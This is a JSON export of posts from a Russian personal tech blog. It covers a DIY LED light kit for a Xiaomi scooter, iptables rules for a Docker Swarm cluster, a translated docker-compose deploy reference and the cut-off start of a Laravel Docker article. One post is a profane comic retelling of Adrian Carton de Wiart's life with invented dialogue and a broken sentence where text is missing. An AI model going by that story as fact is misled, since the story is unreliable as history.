[{"content":"Как пользователь электро-самоката M365 версии Pro со стажем — могу смело заявить, что быть заметным как для участников дорожного движения, так и пешеходного — очень важно. Если передвигаясь днём по обочине дорог и/или тротуару можно считать что твоя заметность достаточна для других участников движения (недостаток с лихвой компенсируется светоотражающим жилетом), то вот в темное время суток картина сильно меняется. Особенно это чувствуется при движении по тротуару со включенной фарой - особенность устройства и расположения фары на самокате таковы, что идущих тебе на встречу ты просто слепишь, а сзади тебя не видно от слова совсем.\nЗадавшись вопросом \u0026ldquo;как это можно исправить\u0026rdquo; было принято решение интегрировать пару led-лент в днище самоката так, что бы они освещали землю под ним (тем самым обозначая твоё местоположение для других) и чтоб при этом надежность примененного решения не вызывала сомнения. Ниже будет в меру подробное описание того, как подсветка была имплементирована, какие комплектующие для этого были выбраны, их цены и с какими сложностями столкнулся.\nСхема Как решение любой задачи в программировании начинается с проработки алгоритма, тут всё началось с принципиальной схемы:\n circuit-diagram \nЕсли словами - то мы:\n Берем 2 светодиодные ленты на 12V, питаем их через понижающий блок Понижающий блок в свою очередь запитываем прямо от батареи самоката (через предохранитель на 1A) Для включения понижающего блока используем твердотельное реле, которое \u0026ldquo;включает\u0026rdquo; в работу нашу схему в тот момент, когда мы включаем фару  Таким образом нам не придется выводить какие-либо дополнительные кнопки для включения подсветки (интуитивность на максимуме), пока не включена фара у нас цепь разомкнута (утечки тока минимальны, только через реле совсем чуть-чуть), да и в целом всё довольно просто.\n Делать RGB подсветку с управлением, например - силами Arduino по BT не стал осознанно.\n Комплектующие Что делать - понятно, теперь разбираемся с элементной базой. Взял следующие штуки:\n   Наименование Цена     LED ленты цвета \u0026ldquo;Cold White\u0026rdquo; 12V (IP67) в защитной тубе по 0.5м, 2 шт. 879,70 ₽   Понижающий преобразователь с 20..72V (DC) до 12V (DC) 5A 60W 1 012,17 ₽   Твердотельное реле SSR-DD2205HK на 5A 296,53 ₽   Малый предохранитель 1A на проводе 16 AWG 54,40 ₽   Провод 16AWG (черный и красный), по метру каждого цвета 179,51 ₽   Провод 28AWG двужильный, 5 метров 348,15 ₽   Разъемы XT30 с проводом 16AWG, 3 шт. 378,46 ₽   Разъемы двух-контактные на проводе 22AWG 122,09 ₽    Итого вышло на ~3 300 ₽, и самое дорогое - это понижающий блок. Взял его осознанно \u0026ldquo;подороже\u0026rdquo;, так как и его форм-фактор в виде залитого эпоксидной смолой блока подкупил, и положительные отзывы.\nЖелезо Первое, что было сделано - это \u0026ldquo;закладные\u0026rdquo; для лент на днище деки (по её бокам) самоката. Их цель - защитить ленты от каких-либо механических воздействий (неудачных \u0026ldquo;соскоков\u0026rdquo; с бордюров) и скрыть сам факт присутствия какой-либо кастомизации от любопытных глаз. Для этого в Leroy Merlin приобрел уголок алюминиевый 15х10х2 мм и болты потайные M3x10 мм. (лучше было бы 5 мм.). Далее дело было за малым:\n Примерить (у меня длинна каждого составила 32.5 см.), отрезать, обработать края алюминиевого уголка Просверлить по 4 отверстия и за-зенковать их Нарезать резьбу под M3 в отверстиях деки Загрунтовать и покрасить заготовки На фиксатор резьбы (анаэробный клей) вкрутить винты (прикрутить уголки к деке)   protection-corners   protection-corners-2 \nЛенты Ленты были безжалостно распотрошены и укорочены под длину получившихся закладных. Кроме того провод был заменен на более мощный с толстой изоляцией, так как он будет находиться во внешней среде, и тут я решил заложиться с некоторым запасом. После всех манипуляций с заменой провода края защитной \u0026ldquo;тубы\u0026rdquo; залил бесцветным герметиком Fix All Crystal (к слову - именно его буду использовать и дальше для герметизации стыков и заполнения пустот). Кроме того - края лент были упакованы в термо-усадку, и получилась такая красота:\n led-strip \nДалее монтируем ленты в закладные, попутно сверля необходимые отверстия (по 2 штуки на каждую сторону) и выводим провода лент через \u0026ldquo;родное\u0026rdquo; уплотнительное кольцо стоп-сигнала внутрь деки самоката:\n led-strip-installation   led-strip-installation-2 \nДалее приклеиваем ленты на двухсторонний скотч к закладным, а свободное пространство между защитным кожухом лент и корпусом деки/закладных заполняем всё тем же прозрачным герметиком (не дадим грязи повода скапливаться в образовывавшихся пустотах). Если надо будет ленту заменить - просто срежем всё это добро ножом и зачистим растворителем.\nЭлектроника Вооружившись паяльником и поглядывая на нашу схему собираем все части схемы воедино:\n electronic-part \nДлину проводов подгоняем \u0026ldquo;по месту\u0026rdquo;, а на концы LED-лент припаиваем двойные разъемы так, чтоб всё это добро соединялось без натяжки, но и без сильных излишков.\n Небольшое отступление не по теме сабжа - во время этого этапа ещё и дорожки мосфетов на контроллере усилил, и клеммы подключения мотор-колеса к контроллеру пропаял. Последние, к слову - уже начали отгарать, и их обслуживание пришлось как раз вовремя - через несколько месяцев \u0026ldquo;покатушек\u0026rdquo; они наверняка отгорели бы окончательно.\n Теперь дело за подключением фары самоката к твердотельному реле (чтоб когда мы включили фару - у нас загорелись LED-ленты). Для этого разбираем \u0026ldquo;голову\u0026rdquo; самоката, и разрезав провод питания фары (желто/белый) припаиваем к нему дополнительный разъем (к которому в дальнейшем подключим провод, что потянется до деки). И тут я должен рассказать одну тонкость - на фару подается следующее напряжение:\n   Самокат включен? Фара включена? Фара подключена? Напряжение     Нет Нет Да -   Да Нет Не важно 3.7V (\u0026ldquo;дежурное\u0026rdquo; напряжение)   Да Да Да 4.1V   Да Да Нет 36.3V    Простыми словами - разница между состояниями \u0026ldquo;фара включена\u0026rdquo; и \u0026ldquo;фара выключена\u0026rdquo; (когда фара исправно светится) в напряжении составляет всего 0.4V, а наше твердотельное реле открывается при напряжении от 3V на управляющем вводе. То есть нам нужно понизить значение \u0026ldquo;дежурного\u0026rdquo; напряжения ниже 3V но так, чтоб при включении фары оно было выше этих самых 3V. Сделал это при помощи потециометра (BAOTER 3296 - W 103), что был безжалостно выпаян из какого-то другого регулятора напряжения, что попался под руку. Итоговое сопротивление замерить забыл, каюсь, так что подобрать его придется самостоятельно.\n Ещё одно важное замечание - верхний предел напряжения на управляющем вводе нашего твердотельного реле составляет 32V, и в случае если фара выйдет из строя (не будет потребителя на выводе контроллера, к которому подключена фара) на него будет подаваться 36.6V, что не есть хорошо. Да, у нас стоит сопротивление для понижения напряжения, но долго ли проработает в этом случае реле - предсказать сложно. Надо просто это помнить и в случае выхода фары из строя - заменить её, либо повысить сопротивление.\n Проверив работоспособность схемы собираем всё \u0026ldquo;как было\u0026rdquo;, выводя с фары дополнительный коннектор рядом с родным (потенциометр я \u0026ldquo;посадил\u0026rdquo; прямо на новый вывод в термо-усадке, чтоб была возможность при необходимости подстроить его с минимальными усилиями):\n wheel \nТеперь финишная прямая - аккуратно укладываем все новые компоненты в деке (прокладывая их чем-либо мягким чтоб сидели плотно):\n deck   deck-2 \nИ через \u0026ldquo;гуся\u0026rdquo; да рулевую стойку протягиваем провод, соединяющий вывод фары (после потенциометра) и выводы управления твердотельного реле. Герметизируем деку, закручиваем всё, герметизируем резиновые уплотнители на \u0026ldquo;гусе\u0026rdquo; и рулевой стойке (чтоб там пролез дополнительный провод - их придется немного подрезать) герметиком и наслаждаемся результатом!\nПотребляемая мощность в моем конфиге составляет 1.1 Вт при выключенном свете, и 12.3 Вт когда включена фара + подсветка из LED-лент. За 1 час работы аккумулятор самоката разряжается примерно на 100 мА/ч (из 12800 в стоке), что составляет менее процента от общего объема (замерял при помощи родного приложения, вкладка информации о батарее). Компоненты не греются, совсем (исключением является лишь led-ленты, но даже их повышение температуры еле-еле ощутимо рукой).\n  Ссылки  Комментарий с рекомендацией использовать 4ю ногу драйвера фары или Arduino 1wire ","date":"2021-02-26T10:01:21Z","image":"https://blog.hook.sh/mi-m365-pro-led-backlight/cover_hu00ae8f25842f0e41405e0f3599f8aa5f_12552_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.hook.sh/mi-m365-pro-led-backlight/","title":"Led-подсветка для Xiaomi Mi M365 Pro своими руками"},{"content":"Однажды я решил поднять свой крохотный кластер для приложений, запускаемых в docker-контейнерах. Выбор был между nomad (уже не один комрад его настоятельно рекомендовал - обязательно попробую, но позже), K8S (слишком сложно и дорого по ресурсам для pet-проекта) и Docker Swarm (никакого дополнительного софта не потребуется, поставляется вместе с самим докером). Как ты понимаешь - выбор пал именно на последний.\nПо тому как его поднять и базово настроить - материалов полно, но когда дело дошло до настройки огненной стены - вот тут начались некоторые трудности. Известно, что docker активно эксплуатирует сетевые интерфейсы и iptables для управления трафиком между сетями и контейнерами. Как настроить ограничения доступа к master и worker-нодам кластерам ниже мы и поговорим.\nИтак, мы имеем:\n internal-сеть 10.10.10.0/24, к которой подключены все наши серверы - она используется как внутренняя (без ограничений) для общения сервером между собой (при создании swarm был указан сетевой интерфейс, \u0026ldquo;смотрящий\u0026rdquo; в этй сеть docker swarm init --advertise-addr ens11) Каждый сервер имеет белый \u0026ldquo;внешний\u0026rdquo; IP адрес (на сетевом интерфейсе eth0) Один сервер в роли master-ноды swarm-а - он же выполняет роль точки входа (ingress) в ресурсы кластера, т.е. весь трафик (http(s), tcp, udp) приходит на него и дальше уже перенаправляется в нужные контейнеры балансируя нагрузку (на этом сервере открываются все необходимые порты, что должны \u0026ldquo;светиться\u0026rdquo; наружу, естественно, и ssh для административного доступа). Сами контейнеры, что будут обрабатывать трафик находятся на worker-нодах Два сервера в роли worker-ов - на них то и запускаются приложения в контейнерах, что обрабатывают наши запросы (tcp/udp пакеты)  Нам нужно:\n Не ограничивать исходящий трафик на серверах на eth0 интерфейсе - любой процесс должен без ограничений ходить в глобальную сеть Закрыть входящие на всех портах eth0, кроме явно разрешенных (в нашем случае это будет только ssh на worker-нодах и http\\https\\ssh на master) Для internal-сети на интерфейсе ens11 не вводить никаких ограничений При запуске docker-контейнера, даже с публикацией порта в хост (network: host) - не открывать этот порт \u0026ldquo;наружу\u0026rdquo; (для этого нужно будет явно добавить правило исключения и только на master-ноде)  worker Аналогична для всех worker-нод в кластере. Перед выполнением каких-либо манипуляций c iptables настоятельно рекомендую (читай - обязательно) вывести ноду из работы, для чего на master выполни (подставляя имя или ID нужной ноды):\n$ docker node ls ID HOSTNAME STATUS AVAILABILITY MANAGER STATUS ENGINE VERSION m0au96xa2pfiwxhdhweux5b92 * ingress-1 Ready Active Leader 19.03.12 sweebuhuzfnr2bygrwg4jxddn node-1 Ready Active 19.03.12 5ikrj3ugkdiublkfe70j9upad node-2 Ready Active 19.03.12 $ docker node update node-1 --availability drain А по завершению работ обратно вводи ноду в строй:\n$ docker node update node-1 --availability active Итак, ставим iptables-persistent (все, что ниже выполняется уже на самой worker-ноде):\n$ apt install iptables-persistent $ cd /etc/iptables И приводим файлы rules.v4 и rules.v6 к следующему состоянию (правим только filter, оставил только нужные изменения):\n$ cat ./rules.v4 # ... *filter :INPUT ACCEPT [0:0] :FORWARD ACCEPT [0:0] :OUTPUT ACCEPT [0:0] :CHECKS - [0:0] # added # ... -A INPUT -i eth0 -j CHECKS -A FORWARD ... -A CHECKS -p tcp -m tcp --dport 22 -m comment --comment SSH -j ACCEPT -A CHECKS -m state --state RELATED,ESTABLISHED -j ACCEPT -A CHECKS -p icmp -m icmp --icmp-type 3 -j ACCEPT -A CHECKS -p icmp -m icmp --icmp-type 11 -j ACCEPT -A CHECKS -p icmp -m icmp --icmp-type 8 -m limit --limit 8/sec -j ACCEPT -A CHECKS -j DROP -A DOCKER ... -A DOCKER-ISOLATION-STAGE-1 ... -A DOCKER-ISOLATION-STAGE-2 ... -A DOCKER-USER -i eth0 -m state --state RELATED,ESTABLISHED -j ACCEPT -A DOCKER-USER -i eth0 -j DROP COMMIT # ...  Для IPv6 пример взят отсюда\n $ cat ./rules.v6 #... *filter :INPUT DROP [0:0] :FORWARD DROP [0:0] :OUTPUT DROP [0:0] :WCFW-ICMP - [0:0] :WCFW-Local - [0:0] :WCFW-Services - [0:0] :WCFW-State - [0:0] -A INPUT -j WCFW-Local -A INPUT -j WCFW-State -A INPUT -p ipv6-icmp -j WCFW-ICMP -A INPUT -j WCFW-Services -A OUTPUT -j WCFW-Local -A OUTPUT -j WCFW-State -A OUTPUT -j ACCEPT -A WCFW-ICMP -p ipv6-icmp -m icmp6 --icmpv6-type 1 -j ACCEPT -A WCFW-ICMP -p ipv6-icmp -m icmp6 --icmpv6-type 2 -j ACCEPT -A WCFW-ICMP -p ipv6-icmp -m icmp6 --icmpv6-type 3 -j ACCEPT -A WCFW-ICMP -p ipv6-icmp -m icmp6 --icmpv6-type 4 -j ACCEPT -A WCFW-ICMP -p ipv6-icmp -m icmp6 --icmpv6-type 133 -j ACCEPT -A WCFW-ICMP -p ipv6-icmp -m icmp6 --icmpv6-type 134 -j ACCEPT -A WCFW-ICMP -p ipv6-icmp -m icmp6 --icmpv6-type 135 -j ACCEPT -A WCFW-ICMP -p ipv6-icmp -m icmp6 --icmpv6-type 136 -j ACCEPT -A WCFW-ICMP -p ipv6-icmp -m icmp6 --icmpv6-type 128 -m limit --limit 8/sec -j ACCEPT -A WCFW-Local -i lo -j ACCEPT -A WCFW-Services -i eth0 -p tcp -m tcp --dport 22 -m comment --comment SSH -j ACCEPT -A WCFW-State -m conntrack --ctstate INVALID -j DROP -A WCFW-State -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT COMMIT # ... После чего заставляем iptables использовать наши правила:\n$ iptables-restore ./rules.v4 $ ip6tables-restore ./rules.v6 master Аналогично с worker-ами ставим iptables-persistent и приводим к виду:\n$ cat ./rules.v4 # ... *filter :INPUT ACCEPT [0:0] :FORWARD ACCEPT [0:0] :OUTPUT ACCEPT [0:0] :CHECKS - [0:0] # added # ... -A INPUT -i eth0 -j CHECKS -A FORWARD ... -A CHECKS -p tcp -m tcp --dport 22 -m comment --comment SSH -j ACCEPT -A CHECKS -p tcp -m tcp --dport 80 -m comment --comment HTTP -j ACCEPT -A CHECKS -p tcp -m tcp --dport 443 -m comment --comment HTTPS -j ACCEPT -A CHECKS -m state --state RELATED,ESTABLISHED -j ACCEPT -A CHECKS -p icmp -m icmp --icmp-type 3 -j ACCEPT -A CHECKS -p icmp -m icmp --icmp-type 11 -j ACCEPT -A CHECKS -p icmp -m icmp --icmp-type 8 -m limit --limit 8/sec -j ACCEPT -A CHECKS -j DROP -A DOCKER ... -A DOCKER-ISOLATION-STAGE-1 ... -A DOCKER-ISOLATION-STAGE-2 ... -A DOCKER-USER -i eth0 -p tcp -m tcp -m conntrack --ctorigdstport 80 -m comment --comment HTTP -j ACCEPT -A DOCKER-USER -i eth0 -p tcp -m tcp -m conntrack --ctorigdstport 443 -m comment --comment HTTPS -j ACCEPT -A DOCKER-USER -i eth0 -m state --state RELATED,ESTABLISHED -j ACCEPT -A DOCKER-USER -i eth0 -j DROP COMMIT # ... Для IPv6 настройки оставил аналогичными с worker-нодами. Теперь так выполняем:\n$ iptables-restore ./rules.v4 $ ip6tables-restore ./rules.v6 И проверяем извне на предмет \u0026ldquo;осталось ли что-нибудь лишнее\u0026rdquo;:\n$ nmap -v -A -p1-65535 -Pn 11.22.22.11 Где 11.22.22.11 наш белый IP сервера (производим такие манипуляции с каждым сервером) - должны остаться открытые только нужные нам порты. Проверяем и корректность работы приложений, запущенных в кластере (те, что ходят в глобальную сеть - должны успешно в неё ходить). Так же проверяем и с самих севреров (как master, так и worker):\n$ ping 1.1.1.1 PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data. 64 bytes from 1.1.1.1: icmp_seq=1 ttl=57 time=20.2 ms 64 bytes from 1.1.1.1: icmp_seq=2 ttl=57 time=20.3 ms $ ping6 2606:4700:4700::1111 PING 2606:4700:4700::1111(2606:4700:4700::1111) 56 data bytes 64 bytes from 2606:4700:4700::1111: icmp_seq=1 ttl=56 time=21.1 ms 64 bytes from 2606:4700:4700::1111: icmp_seq=2 ttl=56 time=21.3 ms $ docker run --rm alpine:latest ping 1.1.1.1 PING 1.1.1.1 (1.1.1.1): 56 data bytes 64 bytes from 1.1.1.1: seq=0 ttl=56 time=20.531 ms 64 bytes from 1.1.1.1: seq=1 ttl=56 time=20.386 ms $ docker run --rm curlimages/curl -s ipinfo.io/ip 11.22.22.11 $ curl -s ipinfo.io/ip 11.22.22.11 Ссылки по теме  Limiting outside connections to docker container with iptables Docker and iptables Сети Docker изнутри: как Docker использует iptables и интерфейсы Linux Пользовательские правила iptables для docker на примере zabbix Install Docker CE on Debian 10 with Dual stack IPv6-NAT and Firewall Support  ","date":"2020-07-06T15:11:47Z","image":"https://blog.hook.sh/iptables-for-docker-swarm/cover_huca17b364cb926e2346fafd474740dcec_161710_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.hook.sh/iptables-for-docker-swarm/","title":"Настройка iptables для swarm кластера"},{"content":"Хочу рассказать про мужика-медоеда. Этот отморозок вызывает во мне искреннее восхищение.\nЖил-был Адриан Картон ди Виарт. Родился он в 1880 году в Бельгии, в аристократической семье. Чуть ли не с самого рождения он проявил хуевый характер: был вспыльчивым до бешенства, несдержанным, и все споры предпочитал разрешать, уебав противника без предупреждения.\nКогда Адриану исполнилось 17 лет, аристократический папа спихнул его в Оксфорд, и вздохнул с облегчением. Но в университете блистательный отпрыск не успевал по всем предметам. Кроме спорта. Там он был первым. Ну и еще бухать умел.\n— Хуйня какая-то эти ваши науки, — решил Адриан. — Вам не сделать из меня офисного хомячка.\nКогда ему стукнуло 19, на его радость началась англо-бурская война. Ди Виарт понятия не имел, кто с кем воюет, и ему было похуй. Он нашел ближайший рекрутерский пункт — это оказался пункт британской армии. Отправился туда, прибавил себе 6 лет, назвался другим именем, и умотал в Африку.\n— Ишь ты, как заебись! — обрадовался он, оказавшись впервые в настоящем бою. — Пули свищут, народ мрет — красота ж!\nНо тут Адриан был ранен в пах и живот, и его отправили на лечение в Англию. Аристократический папа, счастливый, что сынок наконец нашелся, заявил:\n— Ну все, повыёбывался, и хватит. Возвращайся в Оксфорд. — Да хуй-то там! — захохотал ди Виарт. — Я ж только начал развлекаться!\nПапа убедить его не смог, и похлопотал, чтобы отморозка взяли хотя бы в офицерский корпус. Чтоб фамилию не позорил. Адриан в составе корпуса отправился в Индию, где радостно охотился на кабанов. А в 1904 году снова попал на Бурскую войну, адъютантом командующего.\nТут уж он развернулся с неебической силой. Рвался во всякий бой, хуячил противника так, что аж свои боялись, и говорили:\n— Держитесь подальше от этого распиздяя, он когда в азарте, кого угодно уебет, и не вспомнит.\nХотели ему вручить медаль, но тут выяснилось, что он 7 лет уж воюет за Англию, а сам гражданин Бельгии.\n— Как же так получилось? — спросили Адриана. — Да не похуй ли, за кого воевать? — рассудительно ответил тот.\nНо все же ему дали британское подданство и звание капитана.\nВ 1908 году ди Виарт вдруг лихо выебнулся, женившись на аристократке, у которой родословная была круче, чем у любого породистого спаниеля. Звали ее Фредерика Мария Каролина Генриетта Роза Сабина Франциска Фуггер фон Бабенхаузен.\n— Ну, теперь-то уж он остепенится, — радовался аристократический папа. У пары родились две дочери, но Адриан заскучал, и собрался на войну.\n— Куда ты, Андрюша? — плакала жена, утирая слезы родословной. — Я старый, блядь, солдат, и не знаю слов любви, — сурово отвечал ди Виарт. — Быть женатым мне не понравилось. Все твои имена пока в койке выговоришь, хуй падает. А на самом деле ты какой-то просто Бабенхаузен. Я разочарован. Ухожу.\nИ отвалил на Первую Мировую. Начал он в Сомали, помощником командующего Верблюжьим Корпусом. Во время осады крепости дервишей, ему пулей выбило глаз и оторвало часть уха.\n— Врете, суки, не убьете, — орал ди Виарт, и продолжал штурмовать укрепления, хуяча на верблюде. Под его командованием вражеская крепость была взята. Только тогда ди Виарт соизволил обратиться в госпиталь.\nЕго наградили орденом, и вернули в Британию. Подлечившись, ди Виарт попросился на западный фронт.\n— Вы ж калека, у вас глаза нет, — сказали комиссии. — Все остальное, блядь, есть, — оскалился Адриан. — Отправляйте.\nОн для красоты вставил себе стеклянный глаз. И его отправили. Сразу после комиссии ди Виарт выкинул глаз, натянул черную повязку, и сказал:\n— Буду как Нельсон. Ну или как Кутузов. Похуй, пляшем. — Ну все, пиздец, — сказали немцы, узнав об этом. — Можно сразу сдаваться.\nИ были правы. Ди Виарт херачил их только так. Командовал он пехотной бригадой. Когда убивали командиров других подразделений, принимал командование на себя. И никогда не отступал.\nПод Соммой его ранили в голову и в плечо, под Пашендалем в бедро.\nПодлечившись, он отправлялся снова воевать. В бою на Ипре ему рего не отъебаться, и он будет служить еще лет сто или двести. Его произвели в генерал-лейтенанты, и отправили в Китай, личным представителем Черчилля.\nВ Китае случилась гражданская война, и ди Виарт очень хотел в ней поучаствовать, чтоб кого-нибудь замочить. Но Англия ему запретила. Тогда ди Виарт познакомился с Мао Дзе Дуном, и говорит:\n— А давайте Японию отпиздим? Чо они такие суки? — Нет, лучше давайте вступайте в Китайскую армию, такие люди нам нужны. — Ну на хуй, у вас тут скучно, — заявил ди Виарт. — Вы какие-то слишком мирные.\nИ в 1947 году наконец вышел в отставку. Супруга с труднопроизносимым именем померла. А в 1951 году ди Виарт женился на бабе, которая была на 23 года младше.\n— Вы ж старик уже, да еще и отполовиненный, как же вы с молодой женой справитесь? — охуевали знакомые. — А чего с ней справляться? — браво отвечал ди Виарт. — Хуй мне не оторвало.\n«Честно говоря, я наслаждался войной, — писал он в своих мемуарах. — Конечно, были плохие моменты, но хороших куда больше, не говоря уже о приятном волнении». Умер он в 1963 году, в возрасте 83 лет. Человек-медоед, не иначе.\n (с) Diana Udovichenko\n","date":"2019-01-20T07:52:56Z","image":"https://blog.hook.sh/adrian-karton-di-viart/cover_hue93400e0290949f7e2f718449ca8f3c5_59234_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.hook.sh/adrian-karton-di-viart/","title":"Пули свищут, народ мрет — красота!"},{"content":" Данный пост является переводом части документации, посвященной секции deploy в docker-compose\n deploy  Начиная с версии 3.\n Группа настроек, посвященная деплою и запуску сервисов. Указанные в данной группе настройки используются только при деплое на swarm используя docker stack deploy, и игнорируется при использовании команд docker-compose up и docker-compose run.\nversion:\u0026#39;3\u0026#39;services:redis:image:redis:alpinedeploy:replicas:6update_config:parallelism:2delay:10srestart_policy:condition:on-failureДоступны следующие дополнительные опции:\nendpoint_mode Используемый метод обнаружения (\u0026ldquo;service discovery\u0026rdquo;) для внешних запросов от клиентов.\n Начиная с версии 3.3.\n  endpoint_mode: vip - Докер присваивает сервису виртуальный IP адрес (VIP), который выступает в роли \u0026ldquo;внешнего\u0026rdquo; для получения доступа к сервису. Докер сам занимается маршрутизацией запросов между клиентом и доступным воркером (на котором крутится сервис), при этом клиент ничего не знает ни о количестве нод, ни о их IP и портах (используется по умолчанию). endpoint_mode: dnsrr - DNS \u0026ldquo;round-robin\u0026rdquo; (DNSRR) не использует одиночный виртуальный IP адрес. Докер устанавливает DNS записи для сервиса таким образом, что когда клиент его запрашивает - ему возвращается список из IP адресов, и клиент сам подключается к одному из них. DNS \u0026ldquo;round-robin\u0026rdquo; полезен в случаях использования своего собственного балансировщика нагрузки, или для гибридных Windows \u0026amp; Linux приложений.  version:\u0026#34;3.3\u0026#34;services:wordpress:image:wordpressports:- \u0026#34;8080:80\u0026#34;networks:- overlaydeploy:mode:replicatedreplicas:2endpoint_mode:vipmysql:image:mysqlvolumes:- db-data:/var/lib/mysql/datanetworks:- overlaydeploy:mode:replicatedreplicas:2endpoint_mode:dnsrrvolumes:db-data:networks:overlay:endpoint_mode так же можно использовать как флаг запуска при использовании консоли docker service create. Список всех связанных swarm-команд доступен по этой ссылке.\nЕсли вы хотите узнать больше о \u0026ldquo;service discovery\u0026rdquo; и сетях в swarm-режиме, перейдите в раздел настройки service discovery.\nlabels Установка ярлыков (labels) сервиса. Эти ярлыки присваиваются только самому сервису, а не какому-либо контейнеру этого сервиса.\nversion:\u0026#34;3\u0026#34;services:web:image:webdeploy:labels:com.example.description:\u0026#34;This label will appear on the web service\u0026#34;Для установки ярлыков (labels) для контейнеров (а не сервиса), используйте ключ labels вне секции deploy:\nversion:\u0026#34;3\u0026#34;services:web:image:weblabels:com.example.description:\u0026#34;This label will appear on all containers for the web service\u0026#34;mode Может быть глобальным (global, строго один контейнер на swarm-ноде) или реплицированным (replicated, с указанием количества контейнеров). По умолчанию используется replicated. Подробнее можно прочитать в разделе Реплицированные и глобальные сервисы.\nversion:\u0026#39;3\u0026#39;services:worker:image:dockersamples/examplevotingapp_workerdeploy:mode:globalplacement Указание мест размещения контейнеров и их \u0026ldquo;предпочтений\u0026rdquo;. Наиболее полное описание допустимых опций вы сможете найти в разделах \u0026ldquo;constraints\u0026rdquo; и \u0026ldquo;preferences\u0026rdquo; соответственно.\nversion:\u0026#39;3.3\u0026#39;services:db:image:postgresdeploy:placement:constraints:- node.role == manager- engine.labels.operatingsystem == ubuntu 14.04preferences:- spread:node.labels.zonereplicas Если у сервиса выбран режим репликации (replicated, используется по умолчанию) - вы можете указать количество запускаемых контейнеров у данного сервиса.\nversion:\u0026#39;3\u0026#39;services:worker:image:dockersamples/examplevotingapp_workernetworks:- frontend- backenddeploy:mode:replicatedreplicas:6resources Настройка ограничений используемых ресурсов.\n Примечание: Указанные в данной секции опции перекрывают более старые ограничения и опции, что указаны в Compose-файле для не-swarm режима до версии 3 (cpu_shares, cpu_quota, cpuset, mem_limit, memswap_limit, mem_swappiness), как описано в разделе обновление с версии 2.x до 3.x.\n Каждое значение, указанное в данной секции, является аналогом опций для docker service create.\nВ приведенном ниже примере сервис redis может использовать не более 50 Мб памяти и 0.50 (50%) доступного процессорного времени (CPU), а так же имеет зарезервированные 20 Мб памяти и 0.25 CPU (всегда доступные для него).\nversion:\u0026#39;3\u0026#39;services:redis:image:redis:alpinedeploy:resources:limits:cpus:\u0026#39;0.50\u0026#39;memory:50Mreservations:cpus:\u0026#39;0.25\u0026#39;memory:20M Настройка ограничений ресурсов для не-swarm режима доступна в этом разделе. Если у вас возникнут дополнительные вопросы - обратите внимание на этот топик на github.com.\n Исключения класса \u0026ldquo;Out Of Memory\u0026rdquo; (OOME) Если ваши сервисы или контейнеры попытаются использовать объём памяти больше, чем доступен на используемой системе, вы рискуете \u0026ldquo;поймать\u0026rdquo; исключение класса \u0026ldquo;Out Of Memory Exception\u0026rdquo; (OOME) и контейнер, или сам докер-демон может быть прибит демоном ядра системы (\u0026ldquo;kernel OOM killer\u0026rdquo;). Во избежание этого убедитесь в наличии доступных ресурсов на целевой системе и ознакомтесь с разделом понимание рисков недостатка доступной памяти.\nrestart_policy Указывает как и в каких случаях необходимо перезапускать контейнеры когда они останавливаются. Замена секции restart.\n condition (условие): одно из возможных значений - none (никогда), on-failure (при ошибке) или any (всегда) (по умолчанию: any). delay (задержка): Задержка между попытками перезапуска, указывается в формате \u0026ldquo;продолжительность\u0026rdquo; (по умолчанию: 0). max_attempts: Количество предпринимаемых попыток перезапуска перед тем, как прекратить пытаться запустить контейнер (по умолчанию: количество попыток не ограничено). Если контейнер не запустился в пределах указанного \u0026ldquo;окна\u0026rdquo; (window), эта попытка не учитывается при расчете значения max_attempts. Например, если max_attempts установлен равным 2, и перезапуск завершился ошибкой при первой попытке, может быть предпринято более двух попыток перезапуска. window: Задержка перед принятием решения о том, что перезапуск успешно завершился. Указывается в формате \u0026ldquo;продолжительность\u0026rdquo; (по умолчанию: задержка отсутствует).   Для лучшего понимания лучше прочитать первоисточник.\n version:\u0026#39;3\u0026#39;services:redis:image:redis:alpinedeploy:restart_policy:condition:on-failuredelay:5smax_attempts:3window:120supdate_config Настройка обновления сервисов.\n parallelism: Количество одновременно обновляемых контейнеров. Если установить 0, то будет происходить одновременное обновление всех контейнеров. delay: Задержка между обновлениями группы контейнеров (по умолчанию: 0s). failure_action: Действие при ошибке обновления. Может принимать значения: continue, rollback, или pause (по умолчанию: pause). monitor: Продолжительность мониторинга на сбой после каждого обновления (ns|us|ms|s|m|h) (по умолчанию: 0s). max_failure_ratio: Допустимая частота сбоев при обновлении (по умолчанию: 0). order: Порядок операций при обновлении. Может принимать значения: stop-first (старая задача останавливается перед тем, как запускать новую), или start-first (сначала запускается новая задача, а выполняемые задачи ненадолго \u0026ldquo;перекрываются\u0026rdquo;) (по умолчанию: stop-first).   Заметка: Порядок операций при обновлении доступен начиная с версии v3.4 и выше.\n version:\u0026#39;3.4\u0026#39;services:vote:image:dockersamples/examplevotingapp_vote:beforedepends_on:- redisdeploy:replicas:2update_config:parallelism:2delay:10sorder:stop-firstrollback_config  Версия 3.7 и выше\n Настройка откатов сервисов в случае ошибки обновления.\n parallelism: Количество одновременно откатываемых контейнеров. Если установить 0, то будет происходить одновременный откат всех контейнеров. delay: Задержка между откатами группы контейнеров (по умолчанию: 0s). failure_action: Действие при провале отката. Может принимать значения: continue или pause (по умолчанию: pause) monitor: Продолжительность мониторинга на сбой после каждого обновления (ns|us|ms|s|m|h) (по умолчанию: 0s). max_failure_ratio: Допустимая частота сбоев при откате (по умолчанию: 0). order: Порядок операций при откате. Может принимать значения: stop-first (старая задача останавливается перед тем, как запускать новую), или start-first (сначала запускается новая задача, а выполняемые задачи ненадолго \u0026ldquo;перекрываются\u0026rdquo;) (по умолчанию: stop-first).  Не поддерживается в контексте docker stack deploy Следующие настройки не поддерживаются командой docker stack deploy или настройками в группе deploy.\n build cgroup_parent container_name devices tmpfs external_links links network_mode restart security_opt stop_signal sysctls userns_mode   Заметка: Смотри раздел как настраивать тома для сервисов, swarm-ов и docker-stack.yml файлов. Использование томов поддерживается, но они должны быть сконфигурированы как как именованные тома или связаны с сервисами, которые в свою очередь предоставляют доступ к необходимым томам.\n","date":"2018-10-15T13:35:50Z","image":"https://blog.hook.sh/compose-deploy/cover_hu65abd86000f73060febdb2dd524fa8aa_21589_120x120_fill_box_smart1_2.png","permalink":"https://blog.hook.sh/compose-deploy/","title":"Деплой на Docker Swarm"},{"content":" Данная статья является копией публикации на хабре\n В данной статье я расскажу о своём опыте \u0026ldquo;заворачивания\u0026rdquo; Laravel-приложения в Docker-контейнер да так, что бы и локально с 